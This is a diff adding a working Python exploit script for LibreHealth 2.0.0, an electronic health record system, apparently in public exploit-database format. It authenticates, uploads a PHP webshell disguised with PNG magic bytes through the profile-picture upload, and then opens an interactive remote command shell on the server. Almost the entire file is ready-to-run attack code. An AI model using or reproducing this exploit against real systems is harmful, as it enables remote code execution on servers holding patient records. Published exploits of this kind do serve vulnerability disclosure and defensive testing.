@@ -1,0 +1,130 @@
+# Exploit Title: LibreHealth 2.0.0 - Authenticated Remote Code Execution
+# Exploit Author: Bobby Cooke
+# Date: 2020-07-17
+# Vendor Homepage: https://librehealth.io/
+# Software Link: https://github.com/LibreHealthIO/lh-ehr
+# Version: 2.0.0
+# Tested On: Windows 10 Pro 1909 (x64_86) + XAMPP 7.4.4
+# Exploit Tested Using: Python 2.7.17
+# Vulnerability Description:
+# LibreHealth v2.0.0 suffers from an authenticated file upload vulnerability allowing 
+# remote attackers to gain remote code execution (RCE) on the hosting webserver 
+# via uploading a maliciously crafted image.
+
+import requests, sys, re
+from colorama import Fore, Back, Style
+
+requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}
+F = [Fore.RESET,Fore.BLACK,Fore.RED,Fore.GREEN,Fore.YELLOW,Fore.BLUE,Fore.MAGENTA,Fore.CYAN,Fore.WHITE]
+B = [Back.RESET,Back.BLACK,Back.RED,Back.GREEN,Back.YELLOW,Back.BLUE,Back.MAGENTA,Back.CYAN,Back.WHITE]
+S = [Style.RESET_ALL,Style.DIM,Style.NORMAL,Style.BRIGHT]
+info = S[3]+F[5]+'['+S[0]+S[3]+'-'+S[3]+F[5]+']'+S[0]+' '
+err  = S[3]+F[2]+'['+S[0]+S[3]+'!'+S[3]+F[2]+']'+S[0]+' '
+ok   = S[3]+F[3]+'['+S[0]+S[3]+'+'+S[3]+F[3]+']'+S[0]+' '
+
+def webshell(SERVER_URL, WEBSHELL_FILE, session):
+    try:
+        WEB_SHELL = SERVER_URL+'sites/default/profile_pictures/'+WEBSHELL_FILE
+        print(info+"Webshell URL: "+ WEB_SHELL)
+        getdir  = {'telepathy': 'echo %CD%'}
+        r2 = session.post(url=WEB_SHELL, data=getdir, verify=False)
+        status = r2.status_code
+        if status != 200:
+            print(err+"Could not connect to the webshell.")
+            r2.raise_for_status()
+        print(ok+'Successfully connected to webshell.')
+        cwd = re.findall('[CDEF].*', r2.text)
+        cwd = cwd[0]+"> "
+        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET
+        print(S[1]+F[2]+')'+F[4]+'+++++'+F[2]+'['+F[0]+'=========>'+S[0]+S[3]+'     WELCOME BOKU     '+S[0]+S[1]+'<========'+F[2]+']'+F[4]+'+++++'+F[2]+'('+F[0]+S[0])
+        while True:
+            thought = raw_input(term)
+            command = {'telepathy': thought}
+            r2 = requests.post(WEB_SHELL, data=command, verify=False)
+            status = r2.status_code
+            if status != 200:
+                r2.raise_for_status()
+            response2 = r2.text
+            print(response2)
+    except:
+        print('\r\n'+err+'Webshell session failed. Quitting.')
+        quit()
+
+def sig():
+    SIG  = S[3]+F[4]+".-----.._       ,--.\n"
+    SIG += F[4]+"|  ..    >  ___ |  | .--.\n"
+    SIG += F[4]+"|  |.'  ,'-\"   \"-. |/  /__   __\n"
+    SIG += F[4]+"|      < "+F[2]+"   * *"+F[4]+"   \   /   \\/   \\\n"
+    SIG += F[4]+"|  |>   )"+F[2]+" *  *  *"+F[4]+" /    \\        \\\n"
+    SIG += F[4]+"|____..- '-."+F[2]+"*"+F[4]+"_"+F[2]+"*"+F[4]+".-'_|\\___|._..\\___\\\n"
+    SIG += F[4]+"    _______"+F[2]+"github.com/boku7"+F[4]+"_____\n"+S[0]
+    return SIG
+
+def formatHelp(STRING):
+    return S[3]+F[2]+STRING+S[0]
+
+def header():
+    head = S[3]+F[2]+'LibreHealth v2.0.0 - Authenticated Remote Code Execution (RCE)'+S[0]
+    return head
+
+if __name__ == "__main__":
+    print(header())
+    print(sig())
+#0 | Help
+    if len(sys.argv) != 4:
+        print formatHelp("(+) Usage:\t python %s <WEBAPP_URL> <USERNAME> <PASSWORD>" % sys.argv[0])
+        print formatHelp("(+) Example:\t python %s 'http://172.16.65.130/LibreEHR/' 'admin' 'admin'" % sys.argv[0])
+        sys.exit(-1)
+#1 | INIT
+    USERNAME = "admin"
+    PASSWORD = "admin"
+    SERVER_URL = 'http://172.16.65.130/LibreEHR/'
+    if not re.match(r".*/$", SERVER_URL):
+        SERVER_URL = SERVER_URL+'/'
+    LOGIN_URL  = SERVER_URL+'interface/login/login.php'
+    LOGIN_POST = SERVER_URL+'interface/main/main_screen.php?auth=login&site=default'
+    UPLOAD_URL = SERVER_URL+'interface/new/new_comprehensive_save.php'
+#2 | Create Session
+    s = requests.Session()
+    get_session = s.get(LOGIN_URL, verify=False)
+    if get_session.status_code == 200:
+        print(ok+'Successfully connected to LibreHealth server & created session.')
+        print(info+"Session Cookie: "+get_session.headers['Set-Cookie'])
+    else:
+        print(err+'Cannot connect to the server and create a web session.')
+    login_data = {'new_login_session_management':'1', 'authProvider':'Default','authUser':USERNAME,'clearPass':PASSWORD,'languageChoice':'1'}
+    print(info+"Attempting to Login to LibreHealth with credentials: "+USERNAME+":"+PASSWORD)
+    auth = s.post(url=LOGIN_POST, data=login_data, verify=False, proxies=proxies)
+    loginchk  = str(re.findall(r'Calendar', auth.text))
+    if loginchk == "[u'Calendar', u'Calendar']":
+        print(ok+"Login successful.")
+    else:
+        print(err+"Failed login. Check credentials.")
+#3 | File Upload
+    PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
+    png     = {
+                'profile_picture': 
+                  (
+                    'kaio-ken.php', 
+                    PNG_magicBytes+'\n'+'<?php echo shell_exec($_REQUEST["telepathy"]); ?>', 
+                    'image/png', 
+                    {'Content-Disposition': 'form-data'}
+                  ) 
+              }
+    fdata   = {'form_cb_1':'upload','form_fname':'Sun','form_mname':'','form_lname':'Wukong','form_sex':'Male','form_status':'','form_facility':''}
+    print(info+"Exploiting avatar file upload vulnerability to upload a PHP webshell")
+    upload_avatar = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False)
+#4 | Get Webshell Upload Name
+    uploadchk  = str(re.findall(r'demographics\.php\?set_pid=', upload_avatar.text))
+    if uploadchk == "[u'demographics.php?set_pid=']":
+        print(ok+"Successfully uploaded webshell")
+    else:
+        print(err+"Webshell upload failed.")
+    avatarFile = str(re.findall(r'demographics\.php\?set_pid=\d*\&', upload_avatar.text))
+    avatarFile = re.sub('^.*demographics\.php\?set_pid=', '', avatarFile)
+    avatarFile = re.sub('&.*$', '', avatarFile)
+    avatarFile = avatarFile+'.php'
+    print(info+"Webshell Filename: "+avatarFile)
+#5 | interact with webshell for Remote Command Execution
+    webshell(SERVER_URL, avatarFile, s)
